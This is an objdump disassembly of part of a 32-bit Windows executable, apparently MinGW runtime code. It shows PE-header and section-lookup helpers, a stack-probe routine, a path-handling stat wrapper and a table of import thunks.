  40a413:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a41a:	4d 5a 
  40a41c:	74 04                	je     0x40a422
  40a41e:	89 d8                	mov    %ebx,%eax
  40a420:	5b                   	pop    %ebx
  40a421:	c3                   	ret
  40a422:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a427:	e8 74 fe ff ff       	call   0x40a2a0
  40a42c:	85 c0                	test   %eax,%eax
  40a42e:	74 ee                	je     0x40a41e
  40a430:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a435:	0f b7 98 06 00 40 00 	movzwl 0x400006(%eax),%ebx
  40a43c:	89 d8                	mov    %ebx,%eax
  40a43e:	5b                   	pop    %ebx
  40a43f:	c3                   	ret
  40a440:	56                   	push   %esi
  40a441:	31 f6                	xor    %esi,%esi
  40a443:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a44a:	4d 5a 
  40a44c:	53                   	push   %ebx
  40a44d:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40a451:	74 05                	je     0x40a458
  40a453:	89 f0                	mov    %esi,%eax
  40a455:	5b                   	pop    %ebx
  40a456:	5e                   	pop    %esi
  40a457:	c3                   	ret
  40a458:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a45d:	e8 3e fe ff ff       	call   0x40a2a0
  40a462:	85 c0                	test   %eax,%eax
  40a464:	74 ed                	je     0x40a453
  40a466:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a46b:	8d 88 00 00 40 00    	lea    0x400000(%eax),%ecx
  40a471:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  40a478:	8d 54 01 18          	lea    0x18(%ecx,%eax,1),%edx
  40a47c:	0f b7 49 06          	movzwl 0x6(%ecx),%ecx
  40a480:	85 c9                	test   %ecx,%ecx
  40a482:	74 cf                	je     0x40a453
  40a484:	31 c0                	xor    %eax,%eax
  40a486:	f6 42 27 20          	testb  $0x20,0x27(%edx)
  40a48a:	74 07                	je     0x40a493
  40a48c:	85 db                	test   %ebx,%ebx
  40a48e:	74 14                	je     0x40a4a4
  40a490:	83 eb 01             	sub    $0x1,%ebx
  40a493:	83 c0 01             	add    $0x1,%eax
  40a496:	83 c2 28             	add    $0x28,%edx
  40a499:	39 c8                	cmp    %ecx,%eax
  40a49b:	72 e9                	jb     0x40a486
  40a49d:	31 f6                	xor    %esi,%esi
  40a49f:	89 f0                	mov    %esi,%eax
  40a4a1:	5b                   	pop    %ebx
  40a4a2:	5e                   	pop    %esi
  40a4a3:	c3                   	ret
  40a4a4:	89 d6                	mov    %edx,%esi
  40a4a6:	89 f0                	mov    %esi,%eax
  40a4a8:	5b                   	pop    %ebx
  40a4a9:	5e                   	pop    %esi
  40a4aa:	c3                   	ret
  40a4ab:	90                   	nop
  40a4ac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a4b0:	53                   	push   %ebx
  40a4b1:	31 db                	xor    %ebx,%ebx
  40a4b3:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a4ba:	4d 5a 
  40a4bc:	74 04                	je     0x40a4c2
  40a4be:	89 d8                	mov    %ebx,%eax
  40a4c0:	5b                   	pop    %ebx
  40a4c1:	c3                   	ret
  40a4c2:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a4c7:	e8 d4 fd ff ff       	call   0x40a2a0
  40a4cc:	85 c0                	test   %eax,%eax
  40a4ce:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a4d3:	0f 45 d8             	cmovne %eax,%ebx
  40a4d6:	89 d8                	mov    %ebx,%eax
  40a4d8:	5b                   	pop    %ebx
  40a4d9:	c3                   	ret
  40a4da:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a4e0:	31 c0                	xor    %eax,%eax
  40a4e2:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a4e9:	4d 5a 
  40a4eb:	74 03                	je     0x40a4f0
  40a4ed:	c3                   	ret
  40a4ee:	66 90                	xchg   %ax,%ax
  40a4f0:	83 ec 08             	sub    $0x8,%esp
  40a4f3:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a4f8:	e8 a3 fd ff ff       	call   0x40a2a0
  40a4fd:	85 c0                	test   %eax,%eax
  40a4ff:	74 25                	je     0x40a526
  40a501:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40a505:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a50c:	2d 00 00 40 00       	sub    $0x400000,%eax
  40a511:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a515:	e8 c6 fd ff ff       	call   0x40a2e0
  40a51a:	85 c0                	test   %eax,%eax
  40a51c:	74 12                	je     0x40a530
  40a51e:	8b 40 24             	mov    0x24(%eax),%eax
  40a521:	f7 d0                	not    %eax
  40a523:	c1 e8 1f             	shr    $0x1f,%eax
  40a526:	83 c4 08             	add    $0x8,%esp
  40a529:	c3                   	ret
  40a52a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a530:	31 c0                	xor    %eax,%eax
  40a532:	eb f2                	jmp    0x40a526
  40a534:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a53a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  40a540:	57                   	push   %edi
  40a541:	31 ff                	xor    %edi,%edi
  40a543:	56                   	push   %esi
  40a544:	53                   	push   %ebx
  40a545:	83 ec 08             	sub    $0x8,%esp
  40a548:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a54f:	4d 5a 
  40a551:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40a555:	74 09                	je     0x40a560
  40a557:	83 c4 08             	add    $0x8,%esp
  40a55a:	89 f8                	mov    %edi,%eax
  40a55c:	5b                   	pop    %ebx
  40a55d:	5e                   	pop    %esi
  40a55e:	5f                   	pop    %edi
  40a55f:	c3                   	ret
  40a560:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a565:	e8 36 fd ff ff       	call   0x40a2a0
  40a56a:	85 c0                	test   %eax,%eax
  40a56c:	74 e9                	je     0x40a557
  40a56e:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a573:	8b b0 80 00 40 00    	mov    0x400080(%eax),%esi
  40a579:	85 f6                	test   %esi,%esi
  40a57b:	74 da                	je     0x40a557
  40a57d:	89 74 24 04          	mov    %esi,0x4(%esp)
  40a581:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a588:	e8 53 fd ff ff       	call   0x40a2e0
  40a58d:	85 c0                	test   %eax,%eax
  40a58f:	74 c6                	je     0x40a557
  40a591:	81 c6 00 00 40 00    	add    $0x400000,%esi
  40a597:	89 f2                	mov    %esi,%edx
  40a599:	75 0b                	jne    0x40a5a6
  40a59b:	eb ba                	jmp    0x40a557
  40a59d:	8d 76 00             	lea    0x0(%esi),%esi
  40a5a0:	83 eb 01             	sub    $0x1,%ebx
  40a5a3:	83 c2 14             	add    $0x14,%edx
  40a5a6:	8b 4a 04             	mov    0x4(%edx),%ecx
  40a5a9:	85 c9                	test   %ecx,%ecx
  40a5ab:	75 07                	jne    0x40a5b4
  40a5ad:	8b 42 0c             	mov    0xc(%edx),%eax
  40a5b0:	85 c0                	test   %eax,%eax
  40a5b2:	74 1c                	je     0x40a5d0
  40a5b4:	85 db                	test   %ebx,%ebx
  40a5b6:	7f e8                	jg     0x40a5a0
  40a5b8:	8b 7a 0c             	mov    0xc(%edx),%edi
  40a5bb:	83 c4 08             	add    $0x8,%esp
  40a5be:	5b                   	pop    %ebx
  40a5bf:	5e                   	pop    %esi
  40a5c0:	81 c7 00 00 40 00    	add    $0x400000,%edi
  40a5c6:	89 f8                	mov    %edi,%eax
  40a5c8:	5f                   	pop    %edi
  40a5c9:	c3                   	ret
  40a5ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a5d0:	83 c4 08             	add    $0x8,%esp
  40a5d3:	31 ff                	xor    %edi,%edi
  40a5d5:	89 f8                	mov    %edi,%eax
  40a5d7:	5b                   	pop    %ebx
  40a5d8:	5e                   	pop    %esi
  40a5d9:	5f                   	pop    %edi
  40a5da:	c3                   	ret
  40a5db:	90                   	nop
  40a5dc:	90                   	nop
  40a5dd:	90                   	nop
  40a5de:	90                   	nop
  40a5df:	90                   	nop
  40a5e0:	51                   	push   %ecx
  40a5e1:	50                   	push   %eax
  40a5e2:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a5e7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40a5eb:	72 15                	jb     0x40a602
  40a5ed:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40a5f3:	83 09 00             	orl    $0x0,(%ecx)
  40a5f6:	2d 00 10 00 00       	sub    $0x1000,%eax
  40a5fb:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a600:	77 eb                	ja     0x40a5ed
  40a602:	29 c1                	sub    %eax,%ecx
  40a604:	83 09 00             	orl    $0x0,(%ecx)
  40a607:	58                   	pop    %eax
  40a608:	59                   	pop    %ecx
  40a609:	c3                   	ret
  40a60a:	90                   	nop
  40a60b:	90                   	nop
  40a60c:	66 90                	xchg   %ax,%ax
  40a60e:	66 90                	xchg   %ax,%ax
  40a610:	e9 bb 03 00 00       	jmp    0x40a9d0
  40a615:	90                   	nop
  40a616:	90                   	nop
  40a617:	90                   	nop
  40a618:	90                   	nop
  40a619:	90                   	nop
  40a61a:	90                   	nop
  40a61b:	90                   	nop
  40a61c:	90                   	nop
  40a61d:	90                   	nop
  40a61e:	90                   	nop
  40a61f:	90                   	nop
  40a620:	55                   	push   %ebp
  40a621:	57                   	push   %edi
  40a622:	56                   	push   %esi
  40a623:	53                   	push   %ebx
  40a624:	83 ec 4c             	sub    $0x4c,%esp
  40a627:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  40a62b:	8b 7c 24 64          	mov    0x64(%esp),%edi
  40a62f:	85 db                	test   %ebx,%ebx
  40a631:	74 07                	je     0x40a63a
  40a633:	0f b6 13             	movzbl (%ebx),%edx
  40a636:	84 d2                	test   %dl,%dl
  40a638:	75 66                	jne    0x40a6a0
  40a63a:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40a63e:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a642:	89 1c 24             	mov    %ebx,(%esp)
  40a645:	e8 8e 03 00 00       	call   0x40a9d8
  40a64a:	89 c6                	mov    %eax,%esi
  40a64c:	83 fe ff             	cmp    $0xffffffff,%esi
  40a64f:	0f 84 6b 01 00 00    	je     0x40a7c0
  40a655:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40a659:	89 07                	mov    %eax,(%edi)
  40a65b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40a65f:	89 47 04             	mov    %eax,0x4(%edi)
  40a662:	8b 44 24 24          	mov    0x24(%esp),%eax
  40a666:	89 47 08             	mov    %eax,0x8(%edi)
  40a669:	8b 44 24 28          	mov    0x28(%esp),%eax
  40a66d:	89 47 0c             	mov    %eax,0xc(%edi)
  40a670:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40a674:	89 47 10             	mov    %eax,0x10(%edi)
  40a677:	8b 44 24 30          	mov    0x30(%esp),%eax
  40a67b:	89 47 14             	mov    %eax,0x14(%edi)
  40a67e:	8b 44 24 34          	mov    0x34(%esp),%eax
  40a682:	89 47 18             	mov    %eax,0x18(%edi)
  40a685:	8b 44 24 38          	mov    0x38(%esp),%eax
  40a689:	89 47 1c             	mov    %eax,0x1c(%edi)
  40a68c:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40a690:	89 47 20             	mov    %eax,0x20(%edi)
  40a693:	89 f0                	mov    %esi,%eax
  40a695:	83 c4 4c             	add    $0x4c,%esp
  40a698:	5b                   	pop    %ebx
  40a699:	5e                   	pop    %esi
  40a69a:	5f                   	pop    %edi
  40a69b:	5d                   	pop    %ebp
  40a69c:	c3                   	ret
  40a69d:	8d 76 00             	lea    0x0(%esi),%esi
  40a6a0:	89 1c 24             	mov    %ebx,(%esp)
  40a6a3:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40a6a7:	e8 1c 02 00 00       	call   0x40a8c8
  40a6ac:	83 f8 01             	cmp    $0x1,%eax
  40a6af:	89 c6                	mov    %eax,%esi
  40a6b1:	7e 87                	jle    0x40a63a
  40a6b3:	8d 40 fe             	lea    -0x2(%eax),%eax
  40a6b6:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40a6ba:	83 f8 01             	cmp    $0x1,%eax
  40a6bd:	0f 86 d2 00 00 00    	jbe    0x40a795
  40a6c3:	80 fa 2f             	cmp    $0x2f,%dl
  40a6c6:	74 05                	je     0x40a6cd
  40a6c8:	80 fa 5c             	cmp    $0x5c,%dl
  40a6cb:	75 0c                	jne    0x40a6d9
  40a6cd:	0f b6 43 01          	movzbl 0x1(%ebx),%eax
  40a6d1:	3c 2f                	cmp    $0x2f,%al
  40a6d3:	74 5e                	je     0x40a733
  40a6d5:	3c 5c                	cmp    $0x5c,%al
  40a6d7:	74 5a                	je     0x40a733
  40a6d9:	0f b6 44 33 ff       	movzbl -0x1(%ebx,%esi,1),%eax
  40a6de:	3c 5c                	cmp    $0x5c,%al
  40a6e0:	74 08                	je     0x40a6ea
  40a6e2:	3c 2f                	cmp    $0x2f,%al
  40a6e4:	0f 85 50 ff ff ff    	jne    0x40a63a
  40a6ea:	89 34 24             	mov    %esi,(%esp)
  40a6ed:	e8 5e 01 00 00       	call   0x40a850
  40a6f2:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40a6f6:	89 c5                	mov    %eax,%ebp
  40a6f8:	8d 46 ff             	lea    -0x1(%esi),%eax
  40a6fb:	89 44 24 08          	mov    %eax,0x8(%esp)
  40a6ff:	89 2c 24             	mov    %ebp,(%esp)
  40a702:	e8 51 01 00 00       	call   0x40a858
  40a707:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40a70b:	c6 44 35 ff 00       	movb   $0x0,-0x1(%ebp,%esi,1)
  40a710:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a714:	89 2c 24             	mov    %ebp,(%esp)
  40a717:	e8 bc 02 00 00       	call   0x40a9d8
  40a71c:	39 eb                	cmp    %ebp,%ebx
  40a71e:	89 c6                	mov    %eax,%esi
  40a720:	0f 84 26 ff ff ff    	je     0x40a64c
  40a726:	89 2c 24             	mov    %ebp,(%esp)
  40a729:	e8 6a 01 00 00       	call   0x40a898
  40a72e:	e9 19 ff ff ff       	jmp    0x40a64c
  40a733:	0f b6 4b 02          	movzbl 0x2(%ebx),%ecx
  40a737:	8d 53 02             	lea    0x2(%ebx),%edx
  40a73a:	80 f9 5c             	cmp    $0x5c,%cl
  40a73d:	75 12                	jne    0x40a751
  40a73f:	eb 14                	jmp    0x40a755
  40a741:	80 f9 2f             	cmp    $0x2f,%cl
  40a744:	74 5f                	je     0x40a7a5
  40a746:	83 c2 01             	add    $0x1,%edx
  40a749:	0f b6 0a             	movzbl (%edx),%ecx
  40a74c:	80 f9 5c             	cmp    $0x5c,%cl
  40a74f:	74 04                	je     0x40a755
  40a751:	84 c9                	test   %cl,%cl
  40a753:	75 ec                	jne    0x40a741
  40a755:	84 c9                	test   %cl,%cl
  40a757:	75 4c                	jne    0x40a7a5
  40a759:	0f b6 02             	movzbl (%edx),%eax
  40a75c:	84 c0                	test   %al,%al
  40a75e:	66 90                	xchg   %ax,%ax
  40a760:	0f 84 d4 fe ff ff    	je     0x40a63a
  40a766:	3c 5c                	cmp    $0x5c,%al
  40a768:	75 14                	jne    0x40a77e
  40a76a:	eb 16                	jmp    0x40a782
  40a76c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a770:	83 c2 01             	add    $0x1,%edx
  40a773:	0f b6 02             	movzbl (%edx),%eax
  40a776:	3c 5c                	cmp    $0x5c,%al
  40a778:	74 36                	je     0x40a7b0
  40a77a:	84 c0                	test   %al,%al
  40a77c:	74 32                	je     0x40a7b0
  40a77e:	3c 2f                	cmp    $0x2f,%al
  40a780:	75 ee                	jne    0x40a770
  40a782:	80 7a 01 00          	cmpb   $0x0,0x1(%edx)
  40a786:	0f 85 4d ff ff ff    	jne    0x40a6d9
  40a78c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a790:	e9 a5 fe ff ff       	jmp    0x40a63a
  40a795:	80 7b 01 3a          	cmpb   $0x3a,0x1(%ebx)
  40a799:	0f 85 24 ff ff ff    	jne    0x40a6c3
  40a79f:	90                   	nop
  40a7a0:	e9 95 fe ff ff       	jmp    0x40a63a
  40a7a5:	83 c2 01             	add    $0x1,%edx
  40a7a8:	eb af                	jmp    0x40a759
  40a7aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a7b0:	84 c0                	test   %al,%al
  40a7b2:	0f 84 82 fe ff ff    	je     0x40a63a
  40a7b8:	eb c8                	jmp    0x40a782
  40a7ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a7c0:	f7 c7 01 00 00 00    	test   $0x1,%edi
  40a7c6:	ba 24 00 00 00       	mov    $0x24,%edx
  40a7cb:	75 3f                	jne    0x40a80c
  40a7cd:	f7 c7 02 00 00 00    	test   $0x2,%edi
  40a7d3:	75 29                	jne    0x40a7fe
  40a7d5:	89 d1                	mov    %edx,%ecx
  40a7d7:	31 c0                	xor    %eax,%eax
  40a7d9:	c1 e9 02             	shr    $0x2,%ecx
  40a7dc:	f6 c2 02             	test   $0x2,%dl
  40a7df:	f3 ab                	rep stos %eax,%es:(%edi)
  40a7e1:	74 09                	je     0x40a7ec
  40a7e3:	31 c0                	xor    %eax,%eax
  40a7e5:	83 c7 02             	add    $0x2,%edi
  40a7e8:	66 89 47 fe          	mov    %ax,-0x2(%edi)
  40a7ec:	83 e2 01             	and    $0x1,%edx
  40a7ef:	74 03                	je     0x40a7f4
  40a7f1:	c6 07 00             	movb   $0x0,(%edi)
  40a7f4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a7f9:	e9 97 fe ff ff       	jmp    0x40a695
  40a7fe:	31 c9                	xor    %ecx,%ecx
  40a800:	83 c7 02             	add    $0x2,%edi
  40a803:	66 89 4f fe          	mov    %cx,-0x2(%edi)
  40a807:	83 ea 02             	sub    $0x2,%edx
  40a80a:	eb c9                	jmp    0x40a7d5
  40a80c:	c6 07 00             	movb   $0x0,(%edi)
  40a80f:	b2 23                	mov    $0x23,%dl
  40a811:	83 c7 01             	add    $0x1,%edi
  40a814:	eb b7                	jmp    0x40a7cd
  40a816:	90                   	nop
  40a817:	90                   	nop
  40a818:	90                   	nop
  40a819:	90                   	nop
  40a81a:	90                   	nop
  40a81b:	90                   	nop
  40a81c:	90                   	nop
  40a81d:	90                   	nop
  40a81e:	90                   	nop
  40a81f:	90                   	nop
  40a820:	ff 25 c4 f2 41 00    	jmp    *0x41f2c4
  40a826:	90                   	nop
  40a827:	90                   	nop
  40a828:	ff 25 d0 f2 41 00    	jmp    *0x41f2d0
  40a82e:	90                   	nop
  40a82f:	90                   	nop
  40a830:	a1 64 e6 41 00       	mov    0x41e664,%eax
  40a835:	c3                   	ret
  40a836:	8d 76 00             	lea    0x0(%esi),%esi
  40a839:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a840:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a844:	87 05 64 e6 41 00    	xchg   %eax,0x41e664
  40a84a:	c3                   	ret
  40a84b:	90                   	nop
  40a84c:	90                   	nop
  40a84d:	90                   	nop
  40a84e:	90                   	nop
  40a84f:	90                   	nop
  40a850:	ff 25 74 f3 41 00    	jmp    *0x41f374
  40a856:	90                   	nop
  40a857:	90                   	nop
  40a858:	ff 25 7c f3 41 00    	jmp    *0x41f37c
  40a85e:	90                   	nop
  40a85f:	90                   	nop
  40a860:	ff 25 dc f2 41 00    	jmp    *0x41f2dc
  40a866:	90                   	nop
  40a867:	90                   	nop
  40a868:	ff 25 d8 f2 41 00    	jmp    *0x41f2d8
  40a86e:	90                   	nop
  40a86f:	90                   	nop
  40a870:	ff 25 fc f2 41 00    	jmp    *0x41f2fc
  40a876:	90                   	nop
  40a877:	90                   	nop
  40a878:	ff 25 44 f3 41 00    	jmp    *0x41f344
  40a87e:	90                   	nop
  40a87f:	90                   	nop
  40a880:	ff 25 64 f3 41 00    	jmp    *0x41f364
  40a886:	90                   	nop
  40a887:	90                   	nop
  40a888:	ff 25 5c f3 41 00    	jmp    *0x41f35c
  40a88e:	90                   	nop
  40a88f:	90                   	nop
  40a890:	ff 25 48 f3 41 00    	jmp    *0x41f348
  40a896:	90                   	nop
  40a897:	90                   	nop
  40a898:	ff 25 60 f3 41 00    	jmp    *0x41f360
  40a89e:	90                   	nop
  40a89f:	90                   	nop
  40a8a0:	ff 25 6c f3 41 00    	jmp    *0x41f36c
  40a8a6:	90                   	nop
  40a8a7:	90                   	nop
  40a8a8:	ff 25 68 f3 41 00    	jmp    *0x41f368
  40a8ae:	90                   	nop
  40a8af:	90                   	nop
  40a8b0:	ff 25 50 f3 41 00    	jmp    *0x41f350
  40a8b6:	90                   	nop
  40a8b7:	90                   	nop
  40a8b8:	ff 25 a4 f3 41 00    	jmp    *0x41f3a4
  40a8be:	90                   	nop
  40a8bf:	90                   	nop
  40a8c0:	ff 25 98 f3 41 00    	jmp    *0x41f398
  40a8c6:	90                   	nop
  40a8c7:	90                   	nop
  40a8c8:	ff 25 a8 f3 41 00    	jmp    *0x41f3a8
  40a8ce:	90                   	nop
  40a8cf:	90                   	nop
  40a8d0:	ff 25 b0 f3 41 00    	jmp    *0x41f3b0
  40a8d6:	90                   	nop
  40a8d7:	90                   	nop
  40a8d8:	ff 25 c0 f3 41 00    	jmp    *0x41f3c0
  40a8de:	90                   	nop
  40a8df:	90                   	nop
  40a8e0:	ff 25 bc f3 41 00    	jmp    *0x41f3bc
  40a8e6:	90                   	nop
  40a8e7:	90                   	nop
  40a8e8:	ff 25 a0 f3 41 00    	jmp    *0x41f3a0
  40a8ee:	90                   	nop
  40a8ef:	90                   	nop
  40a8f0:	ff 25 3c f3 41 00    	jmp    *0x41f33c
  40a8f6:	90                   	nop
  40a8f7:	90                   	nop
  40a8f8:	ff 25 b4 f3 41 00    	jmp    *0x41f3b4
  40a8fe:	90                   	nop
  40a8ff:	90                   	nop
  40a900:	ff 25 b8 f3 41 00    	jmp    *0x41f3b8
  40a906:	90                   	nop
  40a907:	90                   	nop
  40a908:	ff 25 ac f3 41 00    	jmp    *0x41f3ac
  40a90e:	90                   	nop
  40a90f:	90                   	nop
  40a910:	ff 25 80 f3 41 00    	jmp    *0x41f380
  40a916:	90                   	nop
  40a917:	90                   	nop
  40a918:	ff 25 70 f3 41 00    	jmp    *0x41f370
  40a91e:	90                   	nop
  40a91f:	90                   	nop
  40a920:	ff 25 9c f3 41 00    	jmp    *0x41f39c
  40a926:	90                   	nop
  40a927:	90                   	nop
  40a928:	ff 25 e8 f2 41 00    	jmp    *0x41f2e8
  40a92e:	90                   	nop
  40a92f:	90                   	nop
  40a930:	ff 25 54 f3 41 00    	jmp    *0x41f354
  40a936:	90                   	nop
  40a937:	90                   	nop
  40a938:	ff 25 88 f3 41 00    	jmp    *0x41f388
  40a93e:	90                   	nop
  40a93f:	90                   	nop
  40a940:	ff 25 78 f3 41 00    	jmp    *0x41f378
  40a946:	90                   	nop
  40a947:	90                   	nop
  40a948:	ff 25 94 f3 41 00    	jmp    *0x41f394
  40a94e:	90                   	nop
  40a94f:	90                   	nop
  40a950:	ff 25 8c f3 41 00    	jmp    *0x41f38c
  40a956:	90                   	nop
  40a957:	90                   	nop
  40a958:	ff 25 20 f3 41 00    	jmp    *0x41f320
  40a95e:	90                   	nop
  40a95f:	90                   	nop
  40a960:	ff 25 84 f3 41 00    	jmp    *0x41f384
  40a966:	90                   	nop
  40a967:	90                   	nop
  40a968:	ff 25 08 f3 41 00    	jmp    *0x41f308
  40a96e:	90                   	nop
  40a96f:	90                   	nop
  40a970:	ff 25 0c f3 41 00    	jmp    *0x41f30c
  40a976:	90                   	nop
  40a977:	90                   	nop
  40a978:	ff 25 14 f3 41 00    	jmp    *0x41f314
  40a97e:	90                   	nop
  40a97f:	90                   	nop
  40a980:	ff 25 4c f3 41 00    	jmp    *0x41f34c
  40a986:	90                   	nop
  40a987:	90                   	nop
  40a988:	ff 25 40 f3 41 00    	jmp    *0x41f340
  40a98e:	90                   	nop
  40a98f:	90                   	nop
  40a990:	ff 25 90 f3 41 00    	jmp    *0x41f390
  40a996:	90                   	nop
  40a997:	90                   	nop
  40a998:	ff 25 c4 f3 41 00    	jmp    *0x41f3c4
  40a99e:	90                   	nop
  40a99f:	90                   	nop
  40a9a0:	ff 25 04 f3 41 00    	jmp    *0x41f304
  40a9a6:	90                   	nop
  40a9a7:	90                   	nop
  40a9a8:	ff 25 bc f2 41 00    	jmp    *0x41f2bc
  40a9ae:	90                   	nop
  40a9af:	90                   	nop
  40a9b0:	ff 25 28 f3 41 00    	jmp    *0x41f328
  40a9b6:	90                   	nop
  40a9b7:	90                   	nop
  40a9b8:	ff 25 c8 f2 41 00    	jmp    *0x41f2c8
  40a9be:	90                   	nop
  40a9bf:	90                   	nop
  40a9c0:	ff 25 58 f3 41 00    	jmp    *0x41f358
  40a9c6:	90                   	nop
  40a9c7:	90                   	nop
  40a9c8:	ff 25 38 f3 41 00    	jmp    *0x41f338
  40a9ce:	90                   	nop
  40a9cf:	90                   	nop
  40a9d0:	ff 25 2c f3 41 00    	jmp    *0x41f32c
  40a9d6:	90                   	nop
  40a9d7:	90                   	nop
  40a9d8:	ff 25 1c f3 41 00    	jmp    *0x41f31c
  40a9de:	90                   	nop
  40a9df:	90                   	nop
  40a9e0:	ff                   	(bad)
  40a9e1:	ff                   	(bad)
  40a9e2:	ff                   	(bad)
  40a9e3:	ff 00                	incl   (%eax)
  40a9e5:	00 00                	add    %al,(%eax)
  40a9e7:	00 ff                	add    %bh,%bh
  40a9e9:	ff                   	(bad)
  40a9ea:	ff                   	(bad)
  40a9eb:	ff 00                	incl   (%eax)
  40a9ed:	00 00                	add    %al,(%eax)
	...
